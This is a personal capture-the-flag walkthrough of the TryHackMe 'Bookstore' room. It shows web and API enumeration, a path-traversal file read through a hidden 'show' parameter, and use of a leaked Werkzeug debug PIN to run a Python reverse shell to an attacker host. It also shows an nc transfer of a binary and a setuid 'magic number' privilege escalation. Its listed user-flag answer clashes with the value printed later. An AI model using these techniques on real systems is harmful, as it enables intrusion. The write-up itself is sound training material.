<h1 align="center">Bookstore</h1>
<p align="center">July 29, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>449</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>A Beginner level box with basic web enumeration and REST API Fuzzing.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/2e38cb07-e4a1-45e7-ba14-54d83a551ac5"><br>
Click <a href="https://tryhackme.com/room/bookstoreoc">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/4022b328-220e-4022-b6d9-2325e0c1a46e"></p>

<br>

<h2>Task 1 . Bookstore</h2>
<p>Bookstore is a boot2root CTF machine that teaches a beginner penetration tester basic web enumeration and REST API Fuzzing. Several hints can be found when enumerating the services, the idea is to understand how a vulnerable API can be exploited, you can contact me on twitter @siddhantc_ for giving any feedback regarding the machine.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. User flag<br>
<code>e29b05fba5b2a7e69c24a450893158e3</code></p>


<h3>Nmap</h3>

```bash
:~/Bookstore# nmap -sC -sV -p 80,22,5000 TargetIP
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  upnp?
```

<h3>Gobuster</h3>

```bash
:~/Bookstore# gobuster dir -u http://TargetIP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 60
...
.html                (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/assets               (Status: 301) [Size: 311] [--> http://TargetIP/assets/]
/books.html           (Status: 200) [Size: 2940]
/favicon.ico          (Status: 200) [Size: 15406]
/images               (Status: 301) [Size: 311] [--> http://TargetIP/images/]
/index.html           (Status: 200) [Size: 6452]
/index.html           (Status: 200) [Size: 6452]
/javascript           (Status: 301) [Size: 315] [--> http://TargetIP/javascript/]
/LICENSE.txt          (Status: 200) [Size: 17130]
/login.html           (Status: 200) [Size: 5325]
/server-status        (Status: 403) [Size: 276]
```


```bash
:~/Bookstore# gobuster dir -u http://TargetIP:5000 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 60
...
/api                  (Status: 200) [Size: 825]
/console              (Status: 200) [Size: 1985]
/robots.txt           (Status: 200) [Size: 45]
/robots.txt           (Status: 200) [Size: 45]
```

<h3>Web 80</h3>

<img width="936" height="378" alt="image" src="https://github.com/user-attachments/assets/5411e267-a9f5-40f3-af78-d658a27c316f" />


<img width="939" height="389" alt="image" src="https://github.com/user-attachments/assets/c44f27ed-f571-43b7-b4ea-1b6445aeb2b7" />

<img width="932" height="372" alt="image" src="https://github.com/user-attachments/assets/679e907e-54de-4ee2-a022-c25b7d79d11c" />

```bash
<!--GY4CANZUEA3TIIBXGAQDOMZAGNQSAMTGEAZGMIBXG4QDONZAG43SAMTFEA3TSIBWMYQDONJAG42CANZVEA3DEIBWGUQDEZJAGYZSANTGEA3GIIBSMYQDONZAGYYSANZUEA3DGIBWHAQDGZRAG43CAM3EEA2TIIBXGQQDGNZAGYZCAN3BEA3TQIBXGUQDOMRAGRQSAMZREA2DS===
```

<h3>CyberChef</h3>

<img width="937" height="338" alt="image" src="https://github.com/user-attachments/assets/7128ca34-320f-4193-a479-96e6c3d95f03" />

<p>Remember Ricky As...   8:-)</p>

<h3>/login.html</h3>

<img width="831" height="232" alt="image" src="https://github.com/user-attachments/assets/4055a2dd-a351-47bc-b813-136f569e494c" />

<img width="920" height="159" alt="image" src="https://github.com/user-attachments/assets/342e6f3f-b1f9-46fe-9180-741852d22ab6" />

<h3>ffuf</h3>

```bash
:~/Bookstore# ffuf -u 'http://TargetIPFUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
...
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 311, Words: 20, Lines: 10]
favicon.ico             [Status: 200, Size: 15406, Words: 11, Lines: 1]
images                  [Status: 301, Size: 311, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 6452, Words: 470, Lines: 162]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
```

<h3>/assets</h3>

<img width="937" height="176" alt="image" src="https://github.com/user-attachments/assets/4f173c00-e8df-4553-964f-7d0d2b3325a4" />

<h3>/assets/js</h3>

<img width="937" height="265" alt="image" src="https://github.com/user-attachments/assets/8a4516b0-c356-40b1-86f1-3ada127a24c4" />

<h3>/assets/js/api.js</h3>

<img width="847" height="402" alt="image" src="https://github.com/user-attachments/assets/6d4e1b7f-db76-432f-b34a-f41e26dd248d" />

<h3>Target:5000</h3>

<h4>:5000/robots.txt</h4>

<img width="937" height="103" alt="image" src="https://github.com/user-attachments/assets/67449157-d294-4b00-b147-3fa97ef43f9b" />

<h4>:5000/api</h4>

<img width="940" height="335" alt="image" src="https://github.com/user-attachments/assets/b9c1278d-6a0b-4cc2-9894-af5100c9160a" />


```bash
API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```


<h3>dirsearch</h3>

```bash
:~/Bookstore# dirsearch -u http://TargetIP:5000/ -i200,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 4613

Output File: /root/reports/http_TargetIP_5000/__25-07-30_xx-xx-xx.txt

Target: http://TargetIP:5000/

[xx:xx:xx] Starting: 
[xx:xx:xx] 200 -  825B  - /api
[xx:xx:xx] 200 -    2KB - /console
[xx:xx:xx] 200 -   45B  - /robots.txt

Task Completed
```

<h3>wfuzz</h3>

```bash
:~/Bookstore#  wfuzz -u http://TargetIP:5000/api/v1/resources/books\?FUZZ\=../../../../../../../etc/passwd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,503
...
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://TargetIP:5000/api/v1/resources/books?FUZZ=../../../../../../../etc/passwd
Total requests: 218275

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                               
===================================================================

000000391:   200        30 L     38 W     1555 Ch     "show"                                                                
000000482:   200        1 L      1 W      3 Ch        "author"                                                              
000000523:   200        1 L      1 W      3 Ch        "id"                                                                  
000011399:   200        1 L      1 W      3 Ch        "published"                                                           
000049999:   404        1 L      8 W      66 Ch       "nmap-services"         
```

<br>

```bash
http://TargetIP:5000/api/v1/resources/books?show=../../../../../../../etc/passwd
```

<img width="938" height="151" alt="image" src="https://github.com/user-attachments/assets/9952e294-45fe-4940-8464-5c1081f61032" />

```bash
http://10.10.31.71:5000/api/v1/resources/books?show=.bash_history
```

<img width="938" height="155" alt="image" src="https://github.com/user-attachments/assets/d8888097-9261-431b-bd46-d77e4db8e43c" />

<p>123-321-135</p>

<img width="930" height="343" alt="image" src="https://github.com/user-attachments/assets/4a84a11c-de95-4da2-b38d-9510f64342e6" />

<img width="942" height="269" alt="image" src="https://github.com/user-attachments/assets/4cedc25f-9325-4ba3-8723-32f43141bff5" />

```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("AttackIP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

<img width="941" height="266" alt="image" src="https://github.com/user-attachments/assets/bdc59c3d-b889-416b-93bc-5f014aa5a50c" />

<img width="855" height="222" alt="image" src="https://github.com/user-attachments/assets/5349468f-850d-477e-9da4-184bb69f5cf0" />

```bash
sid@bookstore:~$ id
uid=1000(sid) gid=1000(sid) groups=1000(sid)
```

```bash
sid@bookstore:~$ pwd
/home/sid
```

```bash
sid@bookstore:~$ ls
api.py  api-up.sh  books.db  try-harder  user.txt
```

```bash
sid@bookstore:~$ cat user.txt
4ea65eb80ed441adb68246ddf7b964ab
```

<br>

<p>1.2. Root flag<br>
<code>e29b05fba5b2a7e69c24a450893158e3</code></p>

```bash
sid@bookstore:~$ cat api.py
import flask
from flask import request, jsonify
from flask_cors import CORS, cross_origin
import sqlite3
import os
import subprocess


app = flask.Flask(__name__)
cors = CORS(app)
app.config["DEBUG"] = True
app.config['CORS_HEADERS'] = 'Content-Type'


def dict_factory(cursor, row):
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d


@app.route('/', methods=['GET'])
def home():
    return '''
    <title>Home</title>
    <h1>Foxy REST API v2.0</h1>
    <p>This is a REST API for science fiction novels.</p>
 '''

@app.route('/api', methods=['GET'])
ef documentation():
    return '''
	<title>API Documentation</title>
	<h1>API Documentation</h1>
	<h3>Since every good API has a documentation we have one as well!</h3>
	<h2>The various routes this API currently provides are:</h2><br>
	<p>/api/v2/resources/books/all (Retrieve all books and get the output in a json format)</p>
	<p>/api/v2/resources/books/random4 (Retrieve 4 random records)</p>
	<p>/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)</p>
	<p>/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)</p>
	<p>/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)</p>
	<p>/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)</p>
 '''

@app.route('/api/', methods=['GET'])
def same():
    return documentation()

@app.route('/robots.txt', methods=['GET'])
def robots():
    return '''<p>User-agent: *<br><br>
Disallow: /api </p> '''


@app.route('/api/v1/resources/books/all', methods=['GET'])
def api_all():
    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()
    all_books = cur.execute('SELECT * FROM books;').fetchall()

    return jsonify(all_books)

@app.route('/api/v2/resources/books/all', methods=['GET'])
def api_allv2():
    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()
    all_books = cur.execute('SELECT * FROM books;').fetchall()

    return jsonify(all_books)

@app.route('/api/v2/resources/books/random4', methods=['GET'])
def api_random10():
    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()
    all_books = cur.execute('SELECT * FROM books order by random() LIMIT 4;').fetchall()

    return jsonify(all_books)



@app.errorhandler(404)
def page_not_found(e):
    return '''<h1>404</h1>
    <p>The resource requested could not be found.</p>''', 404

@app.route('/api/v2/resources/books', methods=['GET'])
def api_filterv2():
    query_parameters = request.args

    id = query_parameters.get('id')
    published = query_parameters.get('published')
    author = query_parameters.get('author')


    query = "SELECT * FROM books WHERE"
    to_filter = []

    if id:
        query += ' id=? AND'
        to_filter.append(id)
    if published:
        query += ' published=? AND'
        to_filter.append(published)
    if author:
        query += ' author=? AND'
        to_filter.append(author)

    if not (id or published or author):
        return page_not_found(404)

    query = query[:-4] + ';'

    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()

    results = cur.execute(query, to_filter).fetchall()

    return jsonify(results)


@app.route('/api/v1/resources/books', methods=['GET'])
def api_filter():
    query_parameters = request.args

    id = query_parameters.get('id')
    published = query_parameters.get('published')
    author = query_parameters.get('author')
    show  = query_parameters.get('show')

    query = "SELECT * FROM books WHERE"
    to_filter = []

    if id:
        query += ' id=? AND'
        to_filter.append(id)
    if published:
        query += ' published=? AND'
        to_filter.append(published)
    if author:
        query += ' author=? AND'
        to_filter.append(author)
    if show:
        try:
                with open(show, 'r') as f:
                        return f.read()
        except:
                return filename

    if not (id or published or author):
        return page_not_found(404)

    query = query[:-4] + ';'

    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()

    results = cur.execute(query, to_filter).fetchall()

    return jsonify(results)

print(getattr(app, '__name__', getattr(app.__class__, '__name__')))

app.run(host='0.0.0.0', port=5000, debug = True)
```

```bash
sid@bookstore:~$ ls -lah
total 80K
drwxr-xr-x 5 sid  sid  4.0K Oct 20  2020 .
drwxr-xr-x 3 root root 4.0K Oct 20  2020 ..
-r--r--r-- 1 sid  sid  4.6K Oct 20  2020 api.py
-r-xr-xr-x 1 sid  sid   160 Oct 14  2020 api-up.sh
-r--r----- 1 sid  sid   116 Oct 20  2020 .bash_history
-rw-r--r-- 1 sid  sid   220 Oct 20  2020 .bash_logout
-rw-r--r-- 1 sid  sid  3.7K Oct 20  2020 .bashrc
-rw-rw-r-- 1 sid  sid   16K Oct 19  2020 books.db
drwx------ 2 sid  sid  4.0K Oct 20  2020 .cache
drwx------ 3 sid  sid  4.0K Oct 20  2020 .gnupg
drwxrwxr-x 3 sid  sid  4.0K Oct 20  2020 .local
-rw-r--r-- 1 sid  sid   807 Oct 20  2020 .profile
-rwsrwsr-x 1 root sid  8.3K Oct 20  2020 try-harder
-r--r----- 1 sid  sid    33 Oct 15  2020 user.txt
```


```bash
sid@bookstore:~$ cat api-up.sh
#!/bin/bash
if ps -a |grep 'api.py';then
	echo 'API is up';
else
	export WERKZEUG_DEBUG_PIN=123-321-135
	cd /home/sid && /usr/bin/python3  /home/sid/api.py
fi	
```

```bash
sid@bookstore:~$ ./try-harder
What's The Magic Number?!
12345
Incorrect Try Harder
```



```bash
sid@bookstore:~$ nc 10.10.20.182 1337 < try-harder
```

```bash
:~/Bookstore#  nc -nlvp 1337 > try-harder
Listening on 0.0.0.0 1337
Connection received on TargetIP 32924
```

```bash
:~/Bookstore#  file try-harder
try-harder: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a284afaae26d9772bb38113f55cd53608b4a29e, not stripped
```

<img width="331" height="340" alt="image" src="https://github.com/user-attachments/assets/700956f4-44ea-400b-b6ac-7c7f2b417371" />

<img width="1088" height="621" alt="image" src="https://github.com/user-attachments/assets/90384606-fd79-409b-9d9a-5901ef7a8e5e" />

<img width="1089" height="617" alt="image" src="https://github.com/user-attachments/assets/784dd2c8-1d4a-42fa-bb2e-02c1bce75622" />

<img width="1088" height="613" alt="image" src="https://github.com/user-attachments/assets/78d28bb5-289f-4f0c-8ca8-8d6dbc1c0185" />

```bash
:~/Bookstore#  cat script.py
# Given values
target_value = 0x5dcd21f4
xor_value1 = 0x5db3
xor_value2 = 0x1116

# Reversing the XOR chain
magic_number = target_value ^ xor_value1 ^ xor_value2
print(f"----------- Magic Number -------------- =  {magic_number}")
```

```bash
:~/Bookstore# python3 script.py
----------- Magic Number -------------- =  1573743953
```

<img width="482" height="30" alt="image" src="https://github.com/user-attachments/assets/65d39b32-e3f4-495a-8e18-2eb89023d59b" />

```bash
sid@bookstore:~$ ./try-harder
What's The Magic Number?!
1573743953
root@bookstore:~# 
```

```bash
root@bookstore:~# ls -lah /root
total 40K
drwx------  6 root root 4.0K Oct 20  2020 .
drwxr-xr-x 23 root root 4.0K Oct 20  2020 ..
-rw-------  1 root root  492 Oct 20  2020 .bash_history
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  3 root root 4.0K Oct 20  2020 .cache
drwx------  3 root root 4.0K Oct 20  2020 .gnupg
drwxr-xr-x  3 root root 4.0K Oct 20  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Oct 19  2020 root.txt
drwxr-xr-x  2 sid  sid  4.0K Oct 20  2020 s
```

```bash
root@bookstore:~# cat /root/root.txt
e29b05fba5b2a7e69c24a450893158e3
```

<br>
<br>


<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/64aed005-69a6-4665-b314-65c46557d546"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/83b5bdf3-718b-4c69-b56a-7c9ad5206714"></p>


<br>

<h1 align="center">My TryHackMe Journey</h1>
<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 29, 2025     | 449      |     144ᵗʰ    |      5ᵗʰ     |     130ᵗʰ   |     7ᵗʰ    | 117,926  |    882    |    72     |

</div>

<p align="center">Global All Time:   144ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/d7aff0c1-dc90-483a-8b08-d50d3df5da67"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/390e2a7b-2319-4712-bc8c-563c9107ea2a"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/55ae2acb-dd53-48c4-9dea-6e9ed89b9f0f"><br>
                  Global monthly:    130ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/ae544053-2d0e-4620-9086-5b8f015ebe5f"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/28ed0b53-e395-456f-98e6-3b5b5bd99f1c"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
